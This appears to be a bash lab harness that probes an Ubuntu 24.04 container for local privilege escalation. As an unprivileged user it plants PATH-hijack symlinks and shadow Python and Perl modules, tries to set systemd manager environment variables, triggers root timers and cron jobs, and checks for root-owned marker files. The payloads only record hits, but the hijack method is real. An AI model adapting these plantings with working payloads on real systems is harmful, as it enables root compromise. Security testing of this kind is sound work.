#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/root-script-import-path.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

section() {
  printf '\n## %s\n' "$1"
}

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

target_root() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q bash -s\n' "$TARGET"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" bash -s
}

target_attacker() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q runuser -u %q -- bash -s\n' "$TARGET" "$ATTACKER"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" runuser -u "$ATTACKER" -- bash -s
}

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

echo "root script import/path/env trust-boundary probe"
echo "target=$TARGET attacker=$ATTACKER"
date '+%Y-%m-%dT%H:%M:%S%z'

target_root "cleanup before probe" <<'TARGET'
set +e
probe=root_script_import_path_probe
rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /var/crash/${probe}* 2>/dev/null || true
rm -f /root/${probe}* 2>/dev/null || true
if systemctl show-environment 2>/dev/null | grep -q "^ROOT_SCRIPT_IMPORT_PATH_PROBE="; then
  systemctl unset-environment ROOT_SCRIPT_IMPORT_PATH_PROBE 2>/dev/null || true
fi
if systemctl show-environment 2>/dev/null | grep -q "^PYTHONPATH=/home/${ATTACKER}/${probe}/"; then
  systemctl unset-environment PYTHONPATH 2>/dev/null || true
fi
if systemctl show-environment 2>/dev/null | grep -q "^PERL5LIB=/home/${ATTACKER}/${probe}/"; then
  systemctl unset-environment PERL5LIB 2>/dev/null || true
fi
if systemctl show-environment 2>/dev/null | grep -q "^PATH=/home/${ATTACKER}/${probe}/"; then
  systemctl unset-environment PATH 2>/dev/null || true
fi
true
TARGET

target_root "target identity, versions, and default root consumers" <<'TARGET'
set +e
echo "== identity =="
cat /etc/os-release
uname -a
ps -p 1 -o pid=,user=,comm=,args=
id "$ATTACKER"
getent group sudo admin adm syslog staff 2>/dev/null || true
runuser -u "$ATTACKER" -- bash -lc 'id; command -v sudo >/dev/null && sudo -n true; echo sudo_rc=$?' 2>&1

echo
echo "== package versions =="
for pkg in systemd cron apt appstream command-not-found debconf needrestart \
  update-notifier-common ubuntu-release-upgrader-core ubuntu-pro-client \
  unattended-upgrades apport apport-core-dump-handler logrotate rsyslog \
  man-db sysstat e2fsprogs fwupd pollinate ufw networkd-dispatcher \
  python3 perl-base sudo; do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t(not installed)\tun\n' "$pkg"
done | sort

echo
echo "== default timers =="
systemctl list-timers --all --no-pager --plain | sed -n '1,80p'

echo
echo "== root/helper units =="
units='apt-daily.service apt-daily-upgrade.service apt-news.service esm-cache.service update-notifier-download.service update-notifier-motd.service motd-news.service ua-timer.service dpkg-db-backup.service logrotate.service e2scrub_all.service sysstat-collect.service sysstat-summary.service man-db.service apport-autoreport.service fwupd-refresh.service pollinate.service networkd-dispatcher.service cron.service ufw.service unattended-upgrades.service'
for u in $units; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState \
    -p Result -p ConditionResult -p FragmentPath -p User -p Group \
    -p WorkingDirectory -p Environment -p PassEnvironment -p ExecStart \
    -p ExecStartPre -p ExecStartPost "$u" 2>&1 || true
done

echo
echo "== apt hook commands =="
find /etc/apt/apt.conf.d -maxdepth 1 -type f -print | sort |
  xargs -r grep -HnE '(Pre-Invoke|Post-Invoke|DPkg::|APT::Update|systemctl|appstreamcli|touch|needrestart|dpkg-preconfigure|cnf-update-db|update-motd)' || true

echo
echo "== cron and logrotate roots =="
nl -ba /etc/crontab /etc/cron.d/sysstat /etc/cron.d/e2scrub_all 2>/dev/null | sed -n '1,120p'
find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly -maxdepth 1 -type f -print 2>/dev/null |
  sort | xargs -r ls -l
find /etc/logrotate.d -maxdepth 1 -type f -print | sort |
  xargs -r grep -HnE '(postrotate|prerotate|script|invoke|systemctl|service|su )' || true

echo
echo "== kernel link protections =="
sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_fifos fs.protected_regular 2>/dev/null || true
TARGET

target_root "helper ownership, search paths, and writable boundaries" <<'TARGET'
set +e
echo "== helper files =="
files='/usr/lib/apt/apt.systemd.daily /usr/lib/update-notifier/package-data-downloader /usr/lib/ubuntu-release-upgrader/release-upgrade-motd /etc/update-motd.d/50-motd-news /usr/lib/ubuntu-advantage/timer.py /usr/lib/ubuntu-advantage/apt_news.py /usr/lib/ubuntu-advantage/esm_cache.py /usr/lib/sysstat/sa1 /usr/lib/sysstat/sa2 /sbin/e2scrub_all /usr/libexec/dpkg/dpkg-db-backup /usr/share/apport/whoopsie-upload-all /usr/share/unattended-upgrades/unattended-upgrade-shutdown /etc/cron.daily/apport /etc/cron.daily/apt-compat /etc/cron.daily/dpkg /etc/cron.daily/logrotate /etc/cron.daily/man-db /etc/cron.daily/sysstat /etc/cron.weekly/man-db /usr/lib/rsyslog/rsyslog-rotate /usr/bin/pollinate /lib/ufw/ufw-init /usr/sbin/dpkg-preconfigure /usr/lib/cnf-update-db'
for f in $files; do
  echo "### $f"
  if [ -e "$f" ] || [ -L "$f" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$f"
    dpkg-query -S "$f" 2>/dev/null || true
    head -n 1 "$f" 2>/dev/null || true
    file -L "$f" 2>/dev/null || true
    grep -nE '(^PATH=|PYTHONPATH|PERL5LIB|mktemp|/tmp|tempfile|import |from |subprocess|system\(|exec |command -v|find |touch |mv |cp |rm |ln |chown |chmod |cat |grep |sed |awk |date |logger|systemctl|service|invoke|run-parts|flock|sadc|savelog|open\(|O_NOFOLLOW)' "$f" 2>/dev/null | sed -n '1,80p'
  else
    echo MISSING
  fi
done

echo
echo "== directory modes =="
paths='/usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/logrotate.d /etc/apt/apt.conf.d /etc/update-motd.d /usr/lib/python3/dist-packages /usr/local/lib/python3.12/dist-packages /usr/share/perl5 /etc/networkd-dispatcher /etc/networkd-dispatcher/routable.d /var/cache/swcatalog /var/lib/command-not-found /var/lib/update-notifier /var/lib/ubuntu-advantage /var/cache/motd-news /var/backups /var/log /var/log/sysstat /var/crash /var/lib/apport /var/lib/apport/autoreport'
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n -> %N' "$p"
  else
    echo "MISSING $p"
  fi
done

echo
echo "== interpreter default paths =="
python3 - <<'PY'
import os, sys, site
print("python_cwd", os.getcwd())
print("python_sys_path")
for p in sys.path:
    print(repr(p))
print("python_sitepackages", site.getsitepackages())
PY
perl -e 'print "perl_inc\n"; print "$_\n" for @INC'

echo
echo "== attacker writability over trust dirs =="
runuser -u "$ATTACKER" -- bash -s <<'ATTACKER'
set +e
id
paths='/usr/local/sbin /usr/local/bin /etc/cron.d /etc/cron.daily /etc/logrotate.d /etc/apt/apt.conf.d /etc/update-motd.d /usr/lib/python3/dist-packages /usr/local/lib/python3.12/dist-packages /usr/share/perl5 /etc/networkd-dispatcher /etc/networkd-dispatcher/routable.d /var/cache/swcatalog /var/lib/command-not-found /var/lib/update-notifier /var/lib/ubuntu-advantage /var/cache/motd-news /var/backups /var/log/sysstat /var/crash /var/lib/apport'
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    if [ -w "$p" ]; then echo "W $p"; else echo "NO_W $p"; fi
  else
    echo "MISSING $p"
  fi
done
ATTACKER
TARGET

target_attacker "plant attacker PATH, Python, and Perl payloads" <<'ATTACKER'
set -e
probe=root_script_import_path_probe
base="$HOME/$probe"
mkdir -p "$base/bin" "$base/py" "$base/perl/Debconf"

cat > "$base/bin/payload" <<'EOF'
#!/bin/sh
cmd="${0##*/}"
euid="$(/usr/bin/id -u 2>/dev/null || echo unknown)"
ruid="$(/usr/bin/id -ru 2>/dev/null || echo unknown)"
{
  printf 'PATH_PAYLOAD cmd=%s euid=%s ruid=%s argv=' "$cmd" "$euid" "$ruid"
  printf '%s ' "$@"
  printf '\n'
  /usr/bin/id
} >> /tmp/root_script_import_path_probe_payload_hits 2>&1
if [ "$euid" = "0" ]; then
  {
    echo "ROOT PATH PAYLOAD: $cmd"
    /usr/bin/id
  } > /root/root_script_import_path_probe_path_marker 2>&1
fi
exit 127
EOF
chmod 755 "$base/bin/payload"
for name in appstreamcli apt-config apt-get awk basename cat chmod chown cloud-id cmp command cut date dirname dpkg dpkg-preconfigure du find flock grep head id install invoke-rc.d logger ls lsb_release mandb mkdir mktemp mv perl python3 readlink rm run-parts sadc savelog sed service sh sleep sort stat systemctl tail tar test touch tr uname wget xargs; do
  ln -sf payload "$base/bin/$name"
done

make_py() {
  local path="$1"
  mkdir -p "$(dirname -- "$base/py/$path")"
  cat > "$base/py/$path" <<'PYEOF'
import os
with open("/tmp/root_script_import_path_probe_python_hits", "a", encoding="utf-8") as fh:
    fh.write(f"PY_PAYLOAD file={__file__} euid={os.geteuid()} uid={os.getuid()}\n")
if os.geteuid() == 0:
    with open("/root/root_script_import_path_probe_python_marker", "w", encoding="utf-8") as fh:
        fh.write(f"ROOT PYTHON PAYLOAD file={__file__} euid={os.geteuid()} uid={os.getuid()}\n")
raise SystemExit(77)
PYEOF
}
for mod in uaclient/__init__.py uaclient/apt_news.py uaclient/timer.py uaclient/esm_cache.py apport/__init__.py apport/fileutils.py apt.py apt_pkg.py CommandNotFound/__init__.py UpdateManager/__init__.py DistUpgrade/__init__.py dbus.py problem_report.py gi/__init__.py; do
  make_py "$mod"
done

cat > "$base/perl/Debconf/Config.pm" <<'PERLEOF'
BEGIN {
    open my $fh, ">>", "/tmp/root_script_import_path_probe_perl_hits";
    print $fh "PERL_PAYLOAD module=Debconf::Config euid=$> ruid=$<\n";
    close $fh;
    if ($> == 0) {
        open my $rf, ">", "/root/root_script_import_path_probe_perl_marker";
        print $rf "ROOT PERL PAYLOAD euid=$> ruid=$<\n";
        close $rf;
    }
}
1;
PERLEOF
chmod -R u+rwX,go+rX "$base"
find "$base" -maxdepth 3 -type f -o -type l | sort
ATTACKER

target_attacker "attacker-controlled env only affects uid1001 direct execution" <<'ATTACKER'
set +e
probe=root_script_import_path_probe
base="$HOME/$probe"
rm -f /tmp/${probe}_payload_hits /tmp/${probe}_python_hits /tmp/${probe}_perl_hits

echo "== PATH direct script check =="
PATH="$base/bin:$PATH" /etc/update-motd.d/50-motd-news --force >/tmp/${probe}_motd_user.out 2>/tmp/${probe}_motd_user.err
echo "motd_rc=$?"
sed -n '1,20p' /tmp/${probe}_motd_user.out /tmp/${probe}_motd_user.err 2>/dev/null

echo
echo "== PYTHONPATH direct script check =="
PYTHONPATH="$base/py" python3 /usr/lib/ubuntu-advantage/apt_news.py >/tmp/${probe}_python_user.out 2>/tmp/${probe}_python_user.err
echo "python_rc=$?"
sed -n '1,30p' /tmp/${probe}_python_user.out /tmp/${probe}_python_user.err 2>/dev/null

echo
echo "== PERL5LIB direct script check =="
PERL5LIB="$base/perl" /usr/sbin/dpkg-preconfigure --help >/tmp/${probe}_perl_user.out 2>/tmp/${probe}_perl_user.err
echo "perl_rc=$?"
sed -n '1,30p' /tmp/${probe}_perl_user.out /tmp/${probe}_perl_user.err 2>/dev/null

echo
echo "== user-only payload hits =="
cat /tmp/${probe}_payload_hits /tmp/${probe}_python_hits /tmp/${probe}_perl_hits 2>/dev/null || true
ATTACKER

target_attacker "uid1001 cannot write root trust roots or set system manager env" <<'ATTACKER'
set +e
probe=root_script_import_path_probe
base="$HOME/$probe"

echo "== write and symlink attempts =="
for p in \
  /usr/local/bin/${probe} \
  /usr/local/sbin/${probe} \
  /etc/cron.d/${probe} \
  /etc/cron.daily/${probe} \
  /etc/logrotate.d/${probe} \
  /etc/apt/apt.conf.d/99${probe} \
  /etc/update-motd.d/99-${probe} \
  /usr/lib/python3/dist-packages/${probe}.py \
  /usr/local/lib/python3.12/dist-packages/${probe}.py \
  /usr/share/perl5/${probe}.pm \
  /etc/networkd-dispatcher/routable.d/${probe} \
  /var/cache/swcatalog/${probe} \
  /var/lib/command-not-found/${probe} \
  /var/lib/update-notifier/${probe} \
  /var/lib/ubuntu-advantage/${probe} \
  /var/backups/${probe} \
  /var/log/sysstat/${probe} \
  /var/lib/apport/autoreport \
  /var/crash/${probe}.crash; do
  printf 'touch %s -> ' "$p"
  err="/tmp/${probe}_touch.err"
  if touch "$p" 2>"$err"; then
    echo OK
  else
    sed -n '1p' "$err"
  fi
  rm -f "$err"
done

for p in /etc/cron.d/${probe}.link /etc/logrotate.d/${probe}.link /etc/apt/apt.conf.d/99${probe}.link /var/crash/${probe}.upload; do
  printf 'symlink %s -> ' "$p"
  err="/tmp/${probe}_link.err"
  if ln -s /root/${probe}_symlink_target "$p" 2>"$err"; then
    echo OK
    case "$p" in /var/crash/${probe}.upload) ls -l "$p";; esac
  else
    sed -n '1p' "$err"
  fi
  rm -f "$err"
done

echo
echo "== system manager environment and service start attempts =="
for cmd in \
  "systemctl --no-ask-password set-environment ROOT_SCRIPT_IMPORT_PATH_PROBE=1" \
  "systemctl --no-ask-password set-environment PATH=$base/bin:/usr/bin:/bin" \
  "systemctl --no-ask-password set-environment PYTHONPATH=$base/py" \
  "systemctl --no-ask-password set-environment PERL5LIB=$base/perl" \
  "systemctl --no-ask-password import-environment PATH PYTHONPATH PERL5LIB" \
  "systemctl --no-ask-password start motd-news.service" \
  "systemctl --no-ask-password start update-notifier-download.service" \
  "systemctl --no-ask-password start apt-news.service"; do
  echo "### $cmd"
  timeout 20s bash -lc "$cmd" 2>&1
  echo "rc=$?"
done
ATTACKER

target_root "trigger default root consumers and verify no attacker payload runs as root" <<'TARGET'
set +e
probe=root_script_import_path_probe
rm -f /tmp/${probe}_payload_hits /tmp/${probe}_python_hits /tmp/${probe}_perl_hits /root/${probe}_path_marker /root/${probe}_python_marker /root/${probe}_perl_marker

echo "== system manager environment before root triggers =="
systemctl show-environment 2>/dev/null | sort || true

echo
echo "== systemd timer/service root triggers =="
units='apt-news.service esm-cache.service update-notifier-download.service update-notifier-motd.service motd-news.service ua-timer.service dpkg-db-backup.service logrotate.service e2scrub_all.service sysstat-collect.service sysstat-summary.service man-db.service apport-autoreport.service fwupd-refresh.service apt-daily.service apt-daily-upgrade.service'
for u in $units; do
  echo "### systemctl start $u"
  timeout 70s systemctl start "$u" 2>&1
  rc=$?
  echo "rc=$rc"
  systemctl show -p Result -p ActiveState -p SubState -p ExecMainStatus -p ConditionResult "$u" 2>&1 || true
done

echo
echo "== cron-compatible root run-parts trigger =="
timeout 70s env -i SHELL=/bin/sh HOME=/root LOGNAME=root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --report /etc/cron.daily 2>&1
echo "cron_daily_rc=$?"

echo
echo "== sysstat cron PATH trigger =="
timeout 30s env -i SHELL=/bin/sh HOME=/root LOGNAME=root PATH=/usr/lib/sysstat:/usr/sbin:/usr/bin:/sbin:/bin debian-sa1 1 1 2>&1
echo "sysstat_cron_rc=$?"

echo
echo "== apt periodic trigger status =="
apt-config dump | grep -E 'APT::Periodic::Enable|APT::Periodic::Update-Package-Lists|APT::Periodic::Unattended-Upgrade' || true
timeout 70s systemctl start apt-daily.service 2>&1
echo "apt_daily_second_rc=$?"

echo
echo "== payload evidence after root triggers =="
for f in /tmp/${probe}_payload_hits /tmp/${probe}_python_hits /tmp/${probe}_perl_hits; do
  echo "### $f"
  if [ -s "$f" ]; then cat "$f"; else echo NO_HITS; fi
done
echo "== /var/crash probe paths after root triggers =="
ls -l /var/crash/${probe}* 2>/dev/null || echo NO_VAR_CRASH_PROBE_PATHS
echo "== root marker files =="
if ls -l /root/${probe}* 2>/dev/null; then
  cat /root/${probe}* 2>/dev/null || true
  echo "ROOT_MARKER_PRESENT"
else
  echo "NO_ROOT_MARKER"
fi
TARGET

target_root "cleanup after probe" <<'TARGET'
set +e
probe=root_script_import_path_probe
rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /var/crash/${probe}* 2>/dev/null || true
rm -f /root/${probe}* 2>/dev/null || true
if systemctl show-environment 2>/dev/null | grep -q "^ROOT_SCRIPT_IMPORT_PATH_PROBE="; then
  systemctl unset-environment ROOT_SCRIPT_IMPORT_PATH_PROBE 2>/dev/null || true
fi
if systemctl show-environment 2>/dev/null | grep -q "^PYTHONPATH=/home/${ATTACKER}/${probe}/"; then
  systemctl unset-environment PYTHONPATH 2>/dev/null || true
fi
if systemctl show-environment 2>/dev/null | grep -q "^PERL5LIB=/home/${ATTACKER}/${probe}/"; then
  systemctl unset-environment PERL5LIB 2>/dev/null || true
fi
if systemctl show-environment 2>/dev/null | grep -q "^PATH=/home/${ATTACKER}/${probe}/"; then
  systemctl unset-environment PATH 2>/dev/null || true
fi
echo "cleanup_done"
TARGET

echo
echo "probe complete: log=$LOG"
